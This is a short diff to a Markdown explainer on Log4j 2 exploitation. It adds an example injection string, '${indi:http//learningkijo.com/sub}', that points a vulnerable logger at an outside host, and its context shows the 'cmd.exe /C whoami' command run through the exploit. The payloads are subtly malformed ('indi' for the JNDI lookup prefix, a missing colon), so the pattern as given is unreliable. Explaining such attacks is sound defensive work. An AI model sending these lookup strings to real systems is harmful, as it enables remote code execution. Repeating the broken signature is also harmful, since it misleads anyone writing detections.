@@ -35,6 +35,11 @@ Attackers exploit vulnerable Log4j 2 systems by sending data containing a specif
 #### A specified URL?
 Here is the pattern of attack - **${indi:ldap//[attacker site]/a}**
 
+e.g.
+```
+${indi:http//learningkijo.com/sub}
+```
+
 #### What commands were executed through the Log4j 2 exploit?
 ```cmd
 cmd.exe /C whoami
